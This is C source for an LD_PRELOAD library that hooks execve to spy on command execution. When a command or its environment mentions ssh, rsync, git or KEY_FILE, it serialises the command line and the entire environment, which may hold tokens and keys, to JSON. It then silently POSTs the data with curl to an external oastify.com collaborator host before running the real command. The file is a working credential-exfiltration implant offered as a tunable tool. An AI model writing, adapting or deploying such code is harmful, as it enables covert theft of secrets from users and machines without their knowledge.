#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <string.h>

// <<< TUNE THESE >>> 
#define CMD_BUF_SIZE     (1024 * 1024)       // 1 MiB for joined argv
#define ENV_BUF_SIZE     (1024 * 1024)       // 1 MiB for joined envp JSON
#define PAYLOAD_BUF_SIZE (2 * 1024 * 1024)   // 2 MiB for entire JSON payload
// <<< FILTER LIST >>> 
// Any of these substrings triggers logging
static const char *filters[] = {
    "KEY_FILE",
    "ssh ",
    "rsync",
    "git ",
    NULL
};
// <<< END TUNING >>>

static void escape_json(const char *src, char *dest, size_t dest_size) {
    size_t j = 0;
    for (size_t i = 0; src[i] && j + 2 < dest_size; i++) {
        unsigned char c = src[i];
        if (c == '"' || c == '\\') {
            if (j + 3 >= dest_size) break;
            dest[j++] = '\\';
            dest[j++] = c;
        } else if (c < 0x20) {
            if (j + 7 >= dest_size) break;
            snprintf(dest + j, 7, "\\u%04x", c);
            j += 6;
        } else {
            dest[j++] = c;
        }
    }
    dest[j] = '\0';
}

typedef int (*orig_execve_f)(const char *path, char *const argv[], char *const envp[]);

int execve(const char *path, char *const argv[], char *const envp[]) {
    // 1) real execve lookup
    orig_execve_f real_execve = (orig_execve_f)dlsym(RTLD_NEXT, "execve");
    if (!real_execve) _exit(1);

    // 2) timestamp
    time_t t = time(NULL);
    char ts[32];
    strftime(ts, sizeof(ts), "%Y-%m-%dT%H:%M:%SZ", gmtime(&t));

    // 3) join argv into cmd string
    char cmd[CMD_BUF_SIZE];
    cmd[0] = '\0';
    for (int i = 0; argv[i] && i < 10000; i++) {
        strncat(cmd, argv[i], sizeof(cmd) - strlen(cmd) - 1);
        if (argv[i+1])
            strncat(cmd, " ", sizeof(cmd) - strlen(cmd) - 1);
    }

    // 4) check filters against path and cmd
    int should_log = 0;
    for (const char **f = filters; *f != NULL; f++) {
        if (strstr(path, *f) || strstr(cmd, *f)) {
            should_log = 1;
            break;
        }
    }

    // 5) if no match yet, check each envp entry
    if (!should_log) {
        for (int i = 0; envp[i] && i < 10000; i++) {
            for (const char **f = filters; *f != NULL; f++) {
                if (strstr(envp[i], *f)) {
                    should_log = 1;
                    break;
                }
            }
            if (should_log) break;
        }
    }

    // 6) only build JSON + fork+curl if a filter matched
    if (should_log) {
        // 6a) build env JSON array
        char env_json[ENV_BUF_SIZE];
        env_json[0] = '\0';
        strncat(env_json, "\"env\":[", sizeof(env_json) - 1);
        for (int i = 0; envp[i] && i < 10000; i++) {
            char esc[4096];
            escape_json(envp[i], esc, sizeof(esc));
            strncat(env_json, "\"", sizeof(env_json) - strlen(env_json) - 1);
            strncat(env_json, esc, sizeof(env_json) - strlen(env_json) - 1);
            strncat(env_json, "\"", sizeof(env_json) - strlen(env_json) - 1);
            if (envp[i+1])
                strncat(env_json, ",", sizeof(env_json) - strlen(env_json) - 1);
        }
        strncat(env_json, "]", sizeof(env_json) - strlen(env_json) - 1);

        // 6b) assemble full JSON payload
        char payload[PAYLOAD_BUF_SIZE];
        snprintf(payload, sizeof(payload),
                 "{\"timestamp\":\"%s\",\"exec\":\"%s\",\"cmd\":\"%s\",%s}",
                 ts, path, cmd, env_json);

        // 6c) non-blocking silent POST
        if (fork() == 0) {
            execlp("curl", "curl",
                   "-s", "-XPOST", "--stderr", "/dev/null", "-o", "/dev/null",
                   "https://yeg4vmlb66avz5ril3jqgo7c238uwxkm.oastify.com/ld_preload",
                   "-H", "Content-Type: application/json",
                   "--data", payload,
                   (char*)NULL);
            _exit(0);
        }
    }

    // 7) finally call the real execve
    return real_execve(path, argv, envp);
}
